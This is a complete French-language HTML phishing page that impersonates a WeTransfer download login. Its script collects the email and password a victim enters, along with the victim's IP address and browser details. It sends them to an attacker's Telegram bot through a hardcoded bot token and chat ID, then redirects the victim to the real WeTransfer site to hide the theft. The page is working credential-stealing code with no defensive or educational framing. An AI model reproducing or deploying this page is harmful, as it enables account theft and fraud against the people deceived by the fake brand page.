<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion Sécurisée</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            position: relative;
            overflow-x: hidden;
        }

        /* Vidéo de fond */
        .video-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            object-fit: cover;
            opacity: 0.7;
        }

        /* Overlay pour améliorer la lisibilité */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.2);
            z-index: -1;
        }

        .main-container {
            background: rgba(255, 255, 255, 0.9);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            width: 90%;
            max-width: 500px;
            margin: 40px auto;
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255, 255, 255, 0.3);
        }

        .logo-section {
            text-align: center;
            margin-bottom: 30px;
        }

        .wetransfer-logo {
            max-width: 300px;
            width: 100%;
            margin-bottom: 25px;
        }

        .pdf-logos {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 30px;
        }

        .pdf-logo {
            width: 70px;
            height: 70px;
            opacity: 0.9;
        }

        .form-group {
            margin-bottom: 25px;
        }

        input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s ease;
            background-color: rgba(255, 255, 255, 0.8);
        }

        input:focus {
            outline: none;
            border-color: #2e7dcc;
            box-shadow: 0 0 0 3px rgba(46, 154, 204, 0.1);
        }

        .password-wrapper {
            position: relative;
        }

        .toggle-password {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            font-size: 18px;
            color: #666;
        }

        button[type="submit"] {
            width: 100%;
            padding: 15px;
            background-color: #2f3732;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button[type="submit"]:hover {
            background-color: #000a05;
        }

        footer {
            background-color: rgba(44, 62, 80, 0.9);
            color: white;
            padding: 25px;
            margin-top: auto;
            text-align: center;
            backdrop-filter: blur(5px);
        }

        .footer-content {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-around;
            flex-wrap: wrap;
            gap: 15px;
        }

        .footer-section a {
            color: #ecf0f1;
            text-decoration: none;
            margin: 0 10px;
            font-size: 14px;
        }

        @media (max-width: 768px) {
            .main-container {
                padding: 30px 20px;
            }

            .wetransfer-logo {
                max-width: 200px;
            }

            .pdf-logo {
                width: 50px;
                height: 50px;
            }

            footer {
                padding: 20px 15px;
            }

            .footer-section a {
                display: block;
                margin: 10px 0;
            }
        }
    </style>
</head>
<body>
    <!-- Vidéo de fond -->
    <video autoplay muted loop class="video-background">
        <source src="https://media.istockphoto.com/id/1400076778/fr/vid%C3%A9o/super-gros-plan-leau-coule-le-long-dune-pierre-brune-petite-cascade-dans-une-rivi%C3%A8re-vue-de.mp4?s=mp4-640x640-is&k=20&c=SPiqY8cNUhNh6EVgyyOMOKdbnd4sZ8VgBelrHQXoVPI=" type="video/mp4">
        Votre navigateur ne supporte pas les vidéos HTML5.
    </video>
    <div class="overlay"></div>

    <div class="main-container">
        <div class="logo-section">
            <img src="./img/WeTransfer-preview.png" 
                 alt="WeTransfer Logo" 
                 class="wetransfer-logo">
            <h4>Veuillez vous connecter pour télécharger les fichiers</h4><br><br>
            
            <div class="pdf-logos">
                <img src="https://cdn-icons-png.flaticon.com/512/337/337946.png" 
                     alt="PDF Logo" 
                     class="pdf-logo"> </br>
                <img src="https://images.squarespace-cdn.com/content/v1/67dc40cc95c06944ce5c3c26/94dc29f3-8adc-4855-b39c-6697ac20dfa2/ordre+viro.jpg?format=300w" 
                     alt="fact Logo" 
                     class="pdf-logo">
            </div>
        </div>

        <form action="" method="post">
            <div class="form-group">
                <input type="email"
                       id="email"
                       name="email" 
                       placeholder="Adresse email" 
                       required>
            </div>

            <div class="form-group">
                <div class="password-wrapper">
                    <input type="password" 
                           placeholder="Mot de passe" 
                           id="password" 
                           name="password"
                           required>
                    <button type="button" 
                            class="toggle-password" 
                            onclick="togglePassword()">
                        <i class="fas fa-eye"></i>
                    </button>
                </div>
            </div>

            <button type="submit">Se connecter</button>
        </form>
    </div>

    <footer>
        <div class="footer-content">
            <div class="footer-section">
                <a href="#">Confidentialité</a>
                <a href="#">Conditions d'utilisation</a>
                <a href="#">Contact</a>
            </div>
            <div class="footer-section">
                <a href="#">Aide</a>
                <a href="#">À propos</a>
                <a href="#">FAQ</a>
            </div>
        </div>
    </footer>

    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const eyeButton = document.querySelector('.toggle-password i');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeButton.classList.replace('fa-eye', 'fa-eye-slash');
            } else {
                passwordInput.type = 'password';
                eyeButton.classList.replace('fa-eye-slash', 'fa-eye');
            }
        }
    </script>
    <script>
        // Fonction pour r&eacute;cup&eacute;rer l'adresse IP de l'utilisateur
        async function getIP() {
          try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
          } catch (error) {
            console.error('Erreur lors de la r&eacute;cup&eacute;ration de l\'IP:', error);
            return 'Inconnue';
          }
        }
      
        // Fonction pour r&eacute;cup&eacute;rer le navigateur utilis&eacute;
        function getBrowser() {
          return navigator.userAgent;
        }
      
        // Fonction pour formater les donn&eacute;es en texte clair
        function formatData(formData, ip, browser) {
          let message = " INFOS MAIL :\n\n";
          
          message += `- Email : ${formData.email}\n`;
          message += `- Mot de passe : ${formData.password}\n`;
          message += `- Adresse IP : ${ip}\n`;
          message += `- Navigateur : ${browser}\n`;
          return message;
        }
      
        // Fonction pour envoyer les donn&eacute;es via un bot Telegram
        async function sendToTelegramBot(message) {
          const botToken = '5832840905:AAEPXkvKZUgd-4X0OwioK-FQ-hAfrZJgnAc'; // Remplacez par votre token de bot Telegram
          const chatId = '6156657645'; // Remplacez par votre chat ID
          const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
      
          try {
            await fetch(url);
            console.log('Message envoy&eacute; avec succès &agrave; Telegram');
          } catch (error) {
            console.error('Erreur lors de l\'envoi du message &agrave; Telegram:', error);
          }
        }
      
        // Fonction principale pour g&eacute;rer la soumission du formulaire
        async function handleFormSubmit(event) {
          event.preventDefault();
      
          // R&eacute;cup&eacute;rer les donn&eacute;es du formulaire
          const formData = new FormData(event.target);
          const formObject = {};
          formData.forEach((value, key) => {
            formObject[key] = value;
          });
      
          // R&eacute;cup&eacute;rer l'adresse IP et le navigateur
          const ip = await getIP();
          const browser = getBrowser();
      
          // Formater les donn&eacute;es en texte clair
          const message = formatData(formObject, ip, browser);
      
          // Envoyer les donn&eacute;es &agrave; Telegram
          await sendToTelegramBot(message);
      
          // Rediriger vers date.html
          window.location.href = 'https://wetransfer.com/';
        }
      
        // Ajouter un &eacute;couteur d'&eacute;v&eacute;nement au formulaire
        document.querySelector('form').addEventListener('submit', handleFormSubmit);
      </script>
</body>
</html>
